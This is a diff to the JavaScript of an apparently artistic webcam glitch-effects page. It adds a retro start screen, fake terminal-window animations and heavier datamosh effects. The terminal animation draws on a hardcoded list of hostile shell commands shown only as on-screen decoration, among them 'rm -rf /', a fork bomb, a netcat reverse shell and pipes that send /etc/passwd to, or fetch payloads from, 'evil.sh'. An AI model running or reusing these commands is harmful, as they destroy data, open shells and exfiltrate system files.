@@ -46,54 +46,123 @@ html,body{width:100%;height:100%;background:#000;overflow:hidden;touch-action:no
 <canvas id="sample-canvas" style="display:none"></canvas>
 
 <script>
-// ─── PANTALLA DE INICIO — glitch lines animadas ───────────────────────────────
-const gc  = document.getElementById('glitch-canvas');
-const gctx= gc.getContext('2d');
+// ─── PANTALLA DE INICIO — estilo 16-bit retro ─────────────────────────────────
+const gc   = document.getElementById('glitch-canvas');
+const gctx = gc.getContext('2d');
 let gW, gH;
+let _stars16 = null;
+let _scanOffset = 0;
 
 function resizeGlitch() {
   gW = gc.width  = gc.offsetWidth;
   gH = gc.height = gc.offsetHeight;
+  _stars16 = null; // reset stars on resize
 }
 
 function drawGlitchBG() {
   if (document.getElementById('start').style.display === 'none') return;
-  gctx.clearRect(0, 0, gW, gH);
+  const now = Date.now();
 
-  // Líneas horizontales de glitch rojo
-  const n = 6 + Math.floor(Math.random() * 6);
-  for (let i = 0; i < n; i++) {
-    if (Math.random() > 0.4) continue;
-    const y = Math.floor(Math.random() * gH);
-    const h = 1 + Math.floor(Math.random() * 3);
-    const w = gW * (0.2 + Math.random() * 0.7);
-    const x = Math.random() * (gW - w);
-    gctx.fillStyle = `rgba(220,0,0,${0.15 + Math.random() * 0.35})`;
-    gctx.fillRect(x, y, w, h);
-  }
-
-  // Líneas verticales finas
-  const nv = 3 + Math.floor(Math.random() * 4);
-  for (let i = 0; i < nv; i++) {
-    if (Math.random() > 0.3) continue;
-    const x = Math.floor(Math.random() * gW);
-    const h = gH * (0.05 + Math.random() * 0.3);
-    const y = Math.random() * (gH - h);
-    gctx.fillStyle = `rgba(220,0,0,${0.08 + Math.random() * 0.2})`;
-    gctx.fillRect(x, y, 1, h);
-  }
-
-  // Bloque de ruido binario ocasional
-  if (Math.random() < 0.15) {
-    const bx = Math.floor(Math.random() * gW * 0.7);
-    const by = Math.floor(Math.random() * gH * 0.7);
-    gctx.font = '9px Courier New';
-    for (let r = 0; r < 4; r++) {
-      let row = '';
-      for (let c = 0; c < 18; c++) row += Math.random() > 0.5 ? '1' : '0';
-      gctx.fillStyle = `rgba(220,0,0,${0.1 + Math.random() * 0.25})`;
-      gctx.fillText(row, bx, by + r * 11);
+  // ── Inicializar starfield 16-bit una sola vez ─────────────────────────────
+  if (!_stars16) {
+    _stars16 = [];
+    for (let i = 0; i < 200; i++) {
+      _stars16.push({
+        x:  Math.random() * gW,
+        y:  Math.random() * gH,
+        s:  Math.random() < 0.06 ? 2 : 1,
+        b:  0.25 + Math.random() * 0.75,
+        sp: 0.15 + Math.random() * 1.1
+      });
     }
+  }
+
+  // Fondo negro
+  gctx.fillStyle = '#000';
+  gctx.fillRect(0, 0, gW, gH);
+
+  // ── Starfield — scroll horizontal como pantalla de carga PS1 ─────────────
+  for (const s of _stars16) {
+    s.x -= s.sp;
+    if (s.x < 0) { s.x = gW; s.y = Math.random() * gH; }
+    gctx.fillStyle = `rgba(255,255,255,${s.b})`;
+    gctx.fillRect(Math.floor(s.x), Math.floor(s.y), s.s, s.s);
+  }
+
+  // ── Bloques de VRAM corrompida — artefactos de memoria 16-bit ────────────
+  const pal16 = [
+    [220,0,0],[0,160,255],[255,200,0],[180,0,255],
+    [0,255,100],[255,60,0],[255,255,255],[0,200,180]
+  ];
+  const numBlocks = 3 + Math.floor(Math.random() * 6);
+  for (let i = 0; i < numBlocks; i++) {
+    if (Math.random() > 0.55) continue;
+    const [r,g,b] = pal16[Math.floor(Math.random() * pal16.length)];
+    const bw = Math.floor(gW * (0.04 + Math.random() * 0.38));
+    const bh = Math.floor(1 + Math.random() * 10);
+    const bx = Math.floor(Math.random() * (gW - bw));
+    const by = Math.floor(Math.random() * gH);
+    gctx.fillStyle = `rgba(${r},${g},${b},${0.5 + Math.random() * 0.5})`;
+    gctx.fillRect(bx, by, bw, bh);
+    // Sombra offset — sprite mal alineado
+    if (Math.random() < 0.45) {
+      gctx.fillStyle = `rgba(${r},${g},${b},0.15)`;
+      gctx.fillRect(bx + 4, by + 2, bw, bh);
+    }
+  }
+
+  // ── Tile dithered — textura de fondo 16-bit ───────────────────────────────
+  if (Math.random() < 0.06) {
+    const tx = Math.floor(Math.random() * gW * 0.75);
+    const ty = Math.floor(Math.random() * gH * 0.75);
+    const tw = 30 + Math.floor(Math.random() * 90);
+    const th = 12 + Math.floor(Math.random() * 40);
+    const [r,g,b] = pal16[Math.floor(Math.random() * pal16.length)];
+    for (let dy = 0; dy < th; dy += 2) {
+      for (let dx = (dy/2)%2; dx < tw; dx += 2) {
+        gctx.fillStyle = `rgba(${r},${g},${b},0.3)`;
+        gctx.fillRect(tx+dx, ty+dy, 1, 1);
+      }
+    }
+  }
+
+  // ── Líneas horizontales de corrupción — artifact de render PS1 ────────────
+  const nLines = 2 + Math.floor(Math.random() * 5);
+  for (let i = 0; i < nLines; i++) {
+    if (Math.random() > 0.5) continue;
+    const y  = Math.floor(Math.random() * gH);
+    const lw = gW * (0.1 + Math.random() * 0.8);
+    const lx = Math.random() * (gW - lw);
+    const [r,g,b] = pal16[Math.floor(Math.random() * pal16.length)];
+    gctx.fillStyle = `rgba(${r},${g},${b},${0.18 + Math.random() * 0.55})`;
+    gctx.fillRect(lx, y, lw, 1 + Math.floor(Math.random() * 2));
+  }
+
+  // ── Caracteres glitch 16-bit — texto corrupto flotando ───────────────────
+  const gc16 = '▓▒░█▄▀■□◆?!#@%01';
+  if (Math.random() < 0.28) {
+    const tx  = Math.floor(Math.random() * gW * 0.72);
+    const ty  = Math.floor(gH * 0.1 + Math.random() * gH * 0.8);
+    const len = 3 + Math.floor(Math.random() * 16);
+    const [r,g,b] = pal16[Math.floor(Math.random() * pal16.length)];
+    gctx.font = `${7 + Math.floor(Math.random()*7)}px Courier New`;
+    gctx.fillStyle = `rgba(${r},${g},${b},${0.35 + Math.random()*0.6})`;
+    let str = '';
+    for (let c = 0; c < len; c++) str += gc16[Math.floor(Math.random()*gc16.length)];
+    gctx.fillText(str, tx, ty);
+  }
+
+  // ── Scanlines CRT encima — el toque final de monitor viejo ───────────────
+  for (let y = 0; y < gH; y += 3) {
+    gctx.fillStyle = 'rgba(0,0,0,0.25)';
+    gctx.fillRect(0, y, gW, 1);
+  }
+
+  // ── Flash de pantalla — cambio de escena PS1 ─────────────────────────────
+  if (Math.random() < 0.016) {
+    const [r,g,b] = pal16[Math.floor(Math.random() * pal16.length)];
+    gctx.fillStyle = `rgba(${r},${g},${b},0.1)`;
+    gctx.fillRect(0, 0, gW, gH);
   }
 
   requestAnimationFrame(drawGlitchBG);
@@ -136,7 +205,7 @@ function updateAudioMotion(m) {
 }
 
 // ─── WEBSOCKET ────────────────────────────────────────────────────────────────
-const TD_IP   = '192.168.100.57'; // ← CAMBIA ESTO con ipconfig
+const TD_IP   = '192.168.100.57';
 const TD_PORT = 9090;
 let ws = null;
 
@@ -170,13 +239,13 @@ function triggerMode(nivel) {
     glitchLevel = 1; glitchUntil = now + 3500;
     glitchShift = Array.from({length: rows}, () =>
       Math.random() < 0.2 ? (Math.random()-0.5)*20 : 0);
-    initParticles();
+    _winsData = null; // reset ventanas
   } else if (nivel === 'medio') {
     modeUntil   = now + 4000;
     glitchLevel = 2; glitchUntil = now + 4000;
     glitchShift = Array.from({length: rows}, () =>
       Math.random() < 0.35 ? (Math.random()-0.5)*45 : 0);
-    dmAccum = null; // reset datamosh
+    dmAccum = null;
   } else if (nivel === 'fuerte' || nivel === 'max') {
     currentMode = 'fuerte';
     modeUntil   = now + 5000;
@@ -187,97 +256,196 @@ function triggerMode(nivel) {
   }
 }
 
-// ─── MODO LEVE: POINT CLOUD ───────────────────────────────────────────────────
-let particles = [];
+// ─── MODO LEVE: VIRUS / CODING — ventanas de terminal con código corrupto ─────
+let _winsData = null;
 
-function initParticles() { particles = []; }
+const _codeLines = [
+  'KERNEL PANIC: 0x0000007E','void* malloc(size_t n) {','rm -rf / --no-preserve-root',
+  'while(1) { fork(); }','chmod 777 /etc/shadow','nc -lvp 4444 -e /bin/sh',
+  'dd if=/dev/urandom of=/dev/sda','SELECT * FROM users;--',
+  'ping -f 255.255.255.255','iptables -F && iptables -X','sudo su -',
+  'cat /etc/passwd | nc evil.sh 9999','SEGFAULT at 0xDEADBEEF',
+  'ssh root@10.0.0.1 -p 22','wget http://0.0.0.0/shell | bash',
+  'pkill -9 -f antivirus','mount -o remount,rw /','nmap -sS -O 192.168.1.0/24',
+  'for i in $(seq 1 9999); do','  echo $i >> /dev/null &','done',
+  'grep -r "password" /etc/','openssl enc -aes-256-cbc -in /','base64 /dev/urandom | head',
+  'curl -s evil.sh/payload | sh','crontab -l | grep -v "backup"',
+  'python3 -c "import os;os.system(','  chr(114)+chr(109)+chr(32)+chr(45)','  +chr(114)+chr(102)+chr(32)+chr(47)',')"',
+  'netstat -tulpn | grep LISTEN','lsof -i :4444','strings /dev/mem | grep pass',
+  'strace -p 1 -e trace=network','tcpdump -i eth0 -w /tmp/cap','0x4f5245 0x5220 0x4144454d',
+  'ERROR: stack smashing detected','Segmentation fault (core dumped)','Bus error: 10',
+  '>>> INJECTION SUCCESSFUL <<<','[*] meterpreter session opened','[+] Got system shell!',
+];
 
-function drawPointCloud(fxCtx, now) {
-  fxCtx.fillStyle = '#000';
-  fxCtx.fillRect(0, 0, W, H);
-  if (!cameraActive || !pixelData || video.readyState < 2) return;
+const _winTitles = [
+  'C:\\WINDOWS\\system32\\cmd.exe','root@localhost:~#','/bin/bash — 80x24',
+  'Terminal — bash','Command Prompt','BSOD_DUMP_0x0000007E.log',
+  'kernel.log','access.log','error.log — CRITICAL',
+];
 
-  const t     = now * 0.001;
-  const pulse = 0.6 + Math.sin(t * 3) * 0.4;
-  const stepX = Math.floor(sampleW / 28);
-  const stepY = Math.floor(sampleH / 40);
-
-  // Actualizar / crear partículas
-  let pIdx = 0;
-  for (let py = 0; py < sampleH; py += stepY) {
-    for (let px = 0; px < sampleW; px += stepX) {
-      const mx   = sampleW - 1 - px;
-      const idx  = (py * sampleW + mx) * 4;
-      const luma = pixelData[idx]*0.299 + pixelData[idx+1]*0.587 + pixelData[idx+2]*0.114;
-      if (luma < 30) continue;
-
-      const tx = (px / sampleW) * W;
-      const ty = (py / sampleH) * H;
-
-      if (!particles[pIdx]) {
-        particles[pIdx] = { x: tx, y: ty, vx: 0, vy: 0, l: luma };
-      } else {
-        // Mover suavemente hacia target con vibración
-        const p = particles[pIdx];
-        p.vx += (tx - p.x) * 0.15 + (Math.random()-0.5) * 2.5;
-        p.vy += (ty - p.y) * 0.15 + (Math.random()-0.5) * 2.5;
-        p.vx *= 0.7; p.vy *= 0.7;
-        p.x  += p.vx; p.y += p.vy;
-        p.l   = luma;
-      }
-      pIdx++;
-    }
-  }
-  particles.length = pIdx;
-
-  // Dibujar partículas
-  fxCtx.shadowBlur = 6;
-  for (const p of particles) {
-    const bright = p.l > 160;
-    const size   = bright ? 2.5 : 1.5;
-    const alpha  = (0.4 + (p.l/255) * 0.6) * pulse;
-    if (bright) {
-      fxCtx.fillStyle   = `rgba(200,220,255,${alpha})`;
-      fxCtx.shadowColor = 'rgba(180,200,255,0.8)';
-      fxCtx.shadowBlur  = 10;
-    } else {
-      fxCtx.fillStyle   = `rgba(140,160,220,${alpha})`;
-      fxCtx.shadowColor = 'rgba(140,160,220,0.4)';
-      fxCtx.shadowBlur  = 4;
-    }
-    fxCtx.beginPath();
-    fxCtx.arc(p.x, p.y, size, 0, Math.PI*2);
-    fxCtx.fill();
-  }
-
-  // Conectar partículas muy cercanas con líneas tenues
-  fxCtx.shadowBlur = 0;
-  const maxD = W * 0.045;
-  const maxD2 = maxD * maxD;
-  for (let i = 0; i < particles.length; i++) {
-    for (let j = i+1; j < particles.length; j++) {
-      const dx = particles[i].x - particles[j].x;
-      const dy = particles[i].y - particles[j].y;
-      const d2 = dx*dx + dy*dy;
-      if (d2 < maxD2) {
-        const a = (1 - Math.sqrt(d2)/maxD) * 0.25 * pulse;
-        fxCtx.strokeStyle = `rgba(140,160,220,${a})`;
-        fxCtx.lineWidth   = 0.5;
-        fxCtx.beginPath();
-        fxCtx.moveTo(particles[i].x, particles[i].y);
-        fxCtx.lineTo(particles[j].x, particles[j].y);
-        fxCtx.stroke();
-      }
-    }
-  }
-
-  // Texto
-  fxCtx.fillStyle = 'rgba(140,160,220,0.4)';
-  fxCtx.font = '9px Courier New';
-  fxCtx.fillText(`PTS ${particles.length.toString().padStart(4,'0')} :: 0x${Date.now().toString(16).slice(-8).toUpperCase()}`, 10, H-12);
+function _initWins() {
+  _winsData = { wins: [], lastSpawn: 0 };
+  // Spawn inicial de 2-3 ventanas
+  for (let i = 0; i < 2 + Math.floor(Math.random()*2); i++) _spawnWin();
 }
 
-// ─── MODO MEDIO: THERMAL / DATAMOSH colorido ──────────────────────────────────
+function _spawnWin() {
+  const ww = Math.floor(W * (0.24 + Math.random() * 0.30));
+  const wh = Math.floor(H * (0.20 + Math.random() * 0.25));
+  const wx = Math.floor(Math.random() * Math.max(1, W - ww));
+  const wy = Math.floor(Math.random() * Math.max(1, H - wh));
+  const colors = ['#00ff41','#00cfff','#ff3c00','#c8ff00','#ff00c8','#ffffff'];
+  const color  = colors[Math.floor(Math.random() * colors.length)];
+  const linesTotal = 3 + Math.floor(Math.random() * 6);
+  const lines = [];
+  for (let i = 0; i < linesTotal; i++) {
+    lines.push(_codeLines[Math.floor(Math.random() * _codeLines.length)]);
+  }
+  _winsData.wins.push({
+    x: wx, y: wy, w: ww, h: wh, color,
+    title: _winTitles[Math.floor(Math.random() * _winTitles.length)],
+    lines,
+    visibleChars: 0,   // cuántos chars del texto total se muestran (typewriter)
+    born: Date.now(),
+    life: 1800 + Math.random() * 2800,
+    glitchRow: -1,
+    scrollY: 0,
+  });
+}
+
+function drawPointCloud(fxCtx, now) {
+  if (!_winsData) _initWins();
+
+  // Fondo negro semitransparente — persistencia tipo CRT
+  fxCtx.fillStyle = 'rgba(0,0,0,0.55)';
+  fxCtx.fillRect(0, 0, W, H);
+
+  const t = now * 0.001;
+
+  // ── Spawn de nueva ventana cada cierto tiempo ──────────────────────────────
+  if (now - _winsData.lastSpawn > 900 + Math.random() * 1400) {
+    if (_winsData.wins.length < 6) _spawnWin();
+    _winsData.lastSpawn = now;
+  }
+
+  // ── Eliminar ventanas viejas ───────────────────────────────────────────────
+  _winsData.wins = _winsData.wins.filter(w => now - w.born < w.life);
+
+  // ── Dibujar cada ventana ───────────────────────────────────────────────────
+  const lineH  = 13;
+  const padX   = 6;
+  const titleH = 16;
+
+  for (const w of _winsData.wins) {
+    const age   = now - w.born;
+    const alpha = age < 120 ? age/120 : (age > w.life - 200 ? (w.life-age)/200 : 1);
+    if (alpha <= 0) continue;
+
+    // Borde de ventana
+    fxCtx.globalAlpha = alpha * 0.9;
+    fxCtx.strokeStyle = w.color;
+    fxCtx.lineWidth   = 1;
+    fxCtx.strokeRect(w.x, w.y, w.w, w.h);
+
+    // Barra de título
+    fxCtx.fillStyle = w.color;
+    fxCtx.globalAlpha = alpha * 0.15;
+    fxCtx.fillRect(w.x, w.y, w.w, titleH);
+
+    // Texto del título
+    fxCtx.globalAlpha = alpha * 0.85;
+    fxCtx.fillStyle   = w.color;
+    fxCtx.font        = '9px Courier New';
+    fxCtx.fillText(w.title.slice(0, Math.floor(w.w / 6)), w.x + padX, w.y + 11);
+
+    // Fondo interior muy oscuro
+    fxCtx.globalAlpha = alpha * 0.06;
+    fxCtx.fillStyle   = w.color;
+    fxCtx.fillRect(w.x+1, w.y+titleH, w.w-2, w.h-titleH-1);
+
+    // ── Typewriter de código ─────────────────────────────────────────────────
+    fxCtx.globalAlpha = alpha;
+    fxCtx.font        = '10px Courier New';
+    const maxLines = Math.floor((w.h - titleH - 4) / lineH);
+    // Avanzar chars mostrados
+    w.visibleChars += 3 + Math.floor(Math.random() * 5);
+
+    let totalChars = 0;
+    let linesDone  = 0;
+    for (let li = 0; li < w.lines.length && linesDone < maxLines; li++) {
+      const line     = w.lines[li];
+      const shown    = Math.max(0, Math.min(line.length, w.visibleChars - totalChars));
+      const lineText = line.slice(0, shown);
+      const ly       = w.y + titleH + 4 + linesDone * lineH + lineH;
+
+      // Color según contenido — rojo para errores, verde para éxito, blanco normal
+      if (line.includes('ERROR') || line.includes('PANIC') || line.includes('fault')) {
+        fxCtx.fillStyle = `rgba(255,50,50,${alpha})`;
+      } else if (line.includes('SUCCESS') || line.includes('Got') || line.includes('INJECT')) {
+        fxCtx.fillStyle = `rgba(50,255,80,${alpha})`;
+      } else {
+        fxCtx.fillStyle = `rgba(${parseInt(w.color.slice(1,3),16)||200},${parseInt(w.color.slice(3,5),16)||200},${parseInt(w.color.slice(5,7),16)||200},${alpha*0.85})`;
+      }
+
+      fxCtx.fillText(lineText, w.x + padX, ly);
+
+      // Cursor parpadeante en la línea activa
+      if (li === Math.min(w.lines.length-1, Math.floor(w.visibleChars / 12))) {
+        if (Math.floor(now / 400) % 2 === 0) {
+          fxCtx.fillStyle = w.color;
+          fxCtx.fillRect(w.x + padX + fxCtx.measureText(lineText).width, ly - 10, 6, 11);
+        }
+      }
+
+      totalChars += line.length;
+      linesDone++;
+    }
+
+    // Glitch ocasional en una fila — caracteres corruptos
+    if (Math.random() < 0.04) {
+      w.glitchRow = Math.floor(Math.random() * Math.min(maxLines, w.lines.length));
+    }
+    if (w.glitchRow >= 0 && w.glitchRow < maxLines) {
+      const glitchChars = '▓▒░█?!#@01';
+      let gstr = '';
+      for (let gc2=0; gc2 < 18; gc2++) gstr += glitchChars[Math.floor(Math.random()*glitchChars.length)];
+      fxCtx.fillStyle = `rgba(255,0,0,${alpha * 0.7})`;
+      fxCtx.fillText(gstr, w.x + padX, w.y + titleH + 4 + w.glitchRow * lineH + lineH);
+      if (Math.random() < 0.3) w.glitchRow = -1;
+    }
+
+    fxCtx.globalAlpha = 1;
+  }
+
+  // ── Ruido de fósforo verde de fondo — como terminal vieja ─────────────────
+  if (Math.random() < 0.4) {
+    fxCtx.fillStyle = `rgba(0,255,60,${0.015 + Math.random()*0.025})`;
+    for (let i = 0; i < 8; i++) {
+      fxCtx.fillRect(Math.random()*W, Math.random()*H, 1+Math.random()*2, 1);
+    }
+  }
+
+  // ── Scanlines finas ────────────────────────────────────────────────────────
+  for (let y = 0; y < H; y += 3) {
+    fxCtx.fillStyle = 'rgba(0,0,0,0.12)';
+    fxCtx.fillRect(0, y, W, 1);
+  }
+
+  // ── Glitch strip horizontal ocasional ─────────────────────────────────────
+  if (Math.random() < 0.08) {
+    const gy  = Math.floor(Math.random() * H);
+    const gh  = 1 + Math.floor(Math.random() * 4);
+    const gdx = (Math.random()-0.5) * W * 0.12;
+    fxCtx.drawImage(fxCtx.canvas, 0, gy, W, gh, gdx, gy, W, gh);
+  }
+
+  // HUD
+  fxCtx.fillStyle = 'rgba(0,255,60,0.35)';
+  fxCtx.font = '9px Courier New';
+  fxCtx.fillText(`PROC ${_winsData.wins.length} :: 0x${now.toString(16).slice(-8).toUpperCase()}`, 10, H-12);
+}
+
+// ─── MODO MEDIO: THERMAL / DATAMOSH colorido — NO TOCAR ──────────────────────
 let dmAccum = null;
 
 function drawThermal(fxCtx, now) {
@@ -343,68 +511,161 @@ function drawThermal(fxCtx, now) {
   }
 }
 
-// ─── MODO FUERTE: DATAMOSH agresivo ───────────────────────────────────────────
+// ─── MODO FUERTE: DATAMOSH — súper corrupto, imagen destruida ─────────────────
+let _dmPrev = null;
+
 function drawDatamosh(fxCtx, now) {
   if (!cameraActive || video.readyState < 2) {
     fxCtx.clearRect(0, 0, W, H); return;
   }
+
+  // Canvas de acumulación
   if (!dmAccum || dmAccum.width !== W) {
     dmAccum = document.createElement('canvas');
     dmAccum.width = W; dmAccum.height = H;
+    _dmPrev = null;
   }
-  const ac = dmAccum.getContext('2d');
+  const ac  = dmAccum.getContext('2d');
   const tmp = document.createElement('canvas');
   tmp.width = W; tmp.height = H;
-  const tc = tmp.getContext('2d');
+  const tc  = tmp.getContext('2d');
   tc.save(); tc.scale(-1,1); tc.drawImage(video,-W,0,W,H); tc.restore();
 
-  ac.globalAlpha = 0.75;
-  ac.drawImage(tmp, 0, 0);
-  ac.globalAlpha = 1;
+  const t = now * 0.001;
 
-  const nB = 10 + Math.floor(Math.random()*12);
-  for (let i = 0; i < nB; i++) {
-    const bx = Math.floor(Math.random()*W);
-    const by = Math.floor(Math.random()*H);
-    const bw = 30 + Math.floor(Math.random()*W*0.5);
-    const bh = 2  + Math.floor(Math.random()*40);
-    ac.drawImage(dmAccum, bx, by, bw, bh,
-      bx+(Math.random()-0.5)*W*0.45, by+(Math.random()-0.5)*12, bw, bh);
+  // ── Capturar frame y aplicar channel shift por píxel ────────────────────
+  const capW = Math.min(W, 640), capH = Math.min(H, 480);
+  const src  = document.createElement('canvas');
+  src.width  = capW; src.height = capH;
+  const sctx = src.getContext('2d');
+  sctx.save(); sctx.scale(-1,1); sctx.drawImage(video,-capW,0,capW,capH); sctx.restore();
+
+  const frame  = sctx.getImageData(0, 0, capW, capH);
+  const data   = frame.data;
+  const shiftR = Math.floor(Math.sin(t * 1.8) * 70 + Math.random() * 45);
+  const shiftB = Math.floor(Math.cos(t * 1.1) * 85 + Math.random() * 35);
+  const shifted = new Uint8ClampedArray(data.length);
+
+  for (let y = 0; y < capH; y++) {
+    for (let x = 0; x < capW; x++) {
+      const i  = (y * capW + x) * 4;
+      const xR = Math.min(capW-1, x + shiftR);
+      const iR = (y * capW + xR) * 4;
+      const xB = Math.max(0, x - shiftB);
+      const iB = (y * capW + xB) * 4;
+      shifted[i]   = data[iR];
+      shifted[i+1] = data[i+1];
+      shifted[i+2] = data[iB+2];
+      shifted[i+3] = 255;
+    }
   }
 
+  // ── Pixel sorting en 80% de filas ────────────────────────────────────────
+  const sorted = new Uint8ClampedArray(shifted);
+  const nSort  = Math.floor(capH * 0.80);
+  for (let si = 0; si < nSort; si++) {
+    const y   = Math.floor(Math.random() * capH);
+    const row = [];
+    for (let x = 0; x < capW; x++) {
+      const i    = (y * capW + x) * 4;
+      const luma = shifted[i]*0.299 + shifted[i+1]*0.587 + shifted[i+2]*0.114;
+      row.push({ luma, r: shifted[i], g: shifted[i+1], b: shifted[i+2] });
+    }
+    const start = Math.floor(Math.random() * capW * 0.4);
+    const len   = Math.floor(capW * (0.4 + Math.random() * 0.6));
+    const seg   = row.slice(start, start+len).sort((a,b) => a.luma - b.luma);
+    for (let x = 0; x < seg.length; x++) {
+      const i = (y * capW + start + x) * 4;
+      sorted[i] = seg[x].r; sorted[i+1] = seg[x].g;
+      sorted[i+2] = seg[x].b; sorted[i+3] = 255;
+    }
+  }
+
+  // ── Block displacement agresivo ───────────────────────────────────────────
+  const blocks  = new Uint8ClampedArray(sorted);
+  const nBlocks = 25 + Math.floor(Math.random() * 30);
+  for (let b = 0; b < nBlocks; b++) {
+    const bx  = Math.floor(Math.random() * (capW - 50));
+    const by  = Math.floor(Math.random() * (capH - 15));
+    const bw  = 50 + Math.floor(Math.random() * 200);
+    const bh  = 3  + Math.floor(Math.random() * 50);
+    const dx  = Math.floor((Math.random()-0.5) * capW * 0.8);
+    const dy  = Math.floor((Math.random()-0.5) * capH * 0.3);
+    for (let ry = 0; ry < bh; ry++) {
+      const sy = Math.min(capH-1, by+ry);
+      const ty2 = Math.min(capH-1, Math.max(0, by+ry+dy));
+      for (let rx = 0; rx < bw; rx++) {
+        const sx  = Math.min(capW-1, bx+rx);
+        const tx2 = Math.min(capW-1, Math.max(0, bx+rx+dx));
+        const si2 = (sy*capW+sx)*4;
+        const ti  = (ty2*capW+tx2)*4;
+        blocks[ti]   = Math.min(255, sorted[si2]   * 3.5);
+        blocks[ti+1] = Math.min(255, sorted[si2+1] * 0.2);
+        blocks[ti+2] = Math.min(255, sorted[si2+2] * 4.0);
+        blocks[ti+3] = 255;
+      }
+    }
+  }
+
+  // Boost de saturación global
+  for (let i = 0; i < blocks.length; i+=4) {
+    blocks[i]   = Math.min(255, blocks[i]   * 2.5);
+    blocks[i+1] = Math.min(255, blocks[i+1] * 2.5);
+    blocks[i+2] = Math.min(255, blocks[i+2] * 2.5);
+  }
+
+  sctx.putImageData(new ImageData(blocks, capW, capH), 0, 0);
+
+  // ── Render + ghost frame ──────────────────────────────────────────────────
   fxCtx.clearRect(0, 0, W, H);
-  fxCtx.drawImage(dmAccum, 0, 0);
-
-  fxCtx.globalCompositeOperation = 'screen';
-  fxCtx.globalAlpha = 0.25;
-  fxCtx.drawImage(dmAccum, -16, 6);
-  fxCtx.globalAlpha = 0.2;
-  fxCtx.drawImage(dmAccum, 14, -8);
+  fxCtx.globalAlpha = 0.78;
+  fxCtx.drawImage(src, 0, 0, W, H);
   fxCtx.globalAlpha = 1;
-  fxCtx.globalCompositeOperation = 'source-over';
 
+  if (_dmPrev) {
+    fxCtx.globalAlpha = 0.52;
+    fxCtx.globalCompositeOperation = 'screen';
+    fxCtx.drawImage(_dmPrev, 0, 0, W, H);
+    fxCtx.globalAlpha = 1;
+    fxCtx.globalCompositeOperation = 'source-over';
+  }
+
+  // ── Glitch strips agresivos ────────────────────────────────────────────────
+  const nStrips = 12 + Math.floor(Math.random() * 18);
+  for (let s = 0; s < nStrips; s++) {
+    if (Math.random() > 0.72) continue;
+    const sy  = Math.floor(Math.random() * H);
+    const sh  = 1 + Math.floor(Math.random() * 30);
+    const sdx = (Math.random()-0.5) * W * 0.5;
+    fxCtx.drawImage(fxCtx.canvas, 0, sy, W, sh, sdx, sy, W, sh);
+  }
+
+  // ── Color flash ───────────────────────────────────────────────────────────
+  if (Math.random() < 0.2) {
+    const fc = [
+      'rgba(255,0,200,0.28)','rgba(0,255,80,0.22)',
+      'rgba(255,220,0,0.25)','rgba(0,200,255,0.22)'
+    ];
+    fxCtx.fillStyle = fc[Math.floor(Math.random()*fc.length)];
+    fxCtx.fillRect(0, 0, W, H);
+  }
+
+  // ── Color overlay rotativo ─────────────────────────────────────────────────
   fxCtx.globalCompositeOperation = 'overlay';
-  fxCtx.globalAlpha = 0.35;
-  fxCtx.fillStyle = `hsl(${(now*0.08)%360},100%,50%)`;
+  fxCtx.globalAlpha = 0.28;
+  fxCtx.fillStyle = `hsl(${(now*0.09)%360},100%,50%)`;
   fxCtx.fillRect(0,0,W,H);
   fxCtx.globalAlpha = 1;
   fxCtx.globalCompositeOperation = 'source-over';
 
-  for (let y = 0; y < H; y += 3) {
-    fxCtx.fillStyle = 'rgba(0,0,0,0.2)';
-    fxCtx.fillRect(0, y, W, 1);
-  }
+  // Guardar frame para ghost
+  _dmPrev = document.createElement('canvas');
+  _dmPrev.width = W; _dmPrev.height = H;
+  _dmPrev.getContext('2d').drawImage(fxCtx.canvas, 0, 0);
 
-  if (Math.random() < 0.25) {
-    const gy = Math.floor(Math.random()*H);
-    const gh = 15 + Math.floor(Math.random()*55);
-    fxCtx.drawImage(fxCtx.canvas, 0, gy, W, gh,
-      (Math.random()-0.5)*W*0.5, gy, W, gh);
-  }
-  if (Math.random() < 0.05) {
-    fxCtx.fillStyle = `rgba(255,255,255,${0.1+Math.random()*0.2})`;
-    fxCtx.fillRect(0,0,W,H);
-  }
+  fxCtx.fillStyle = 'rgba(255,220,0,0.35)';
+  fxCtx.font = '9px Courier New';
+  fxCtx.fillText(`DATAMOSH :: ERR 0x${now.toString(16).slice(-6).toUpperCase()}`, 10, H-12);
 }
 
 // ─── MATRIX ENGINE ────────────────────────────────────────────────────────────
@@ -612,8 +873,9 @@ function loop() {
     fxCtx.clearRect(0, 0, W, H);
     currentMode = 'matrix';
     glitchLevel = 0;
-    particles   = [];
+    _winsData   = null;
     dmAccum     = null;
+    _dmPrev     = null;
   }
 
   requestAnimationFrame(loop);
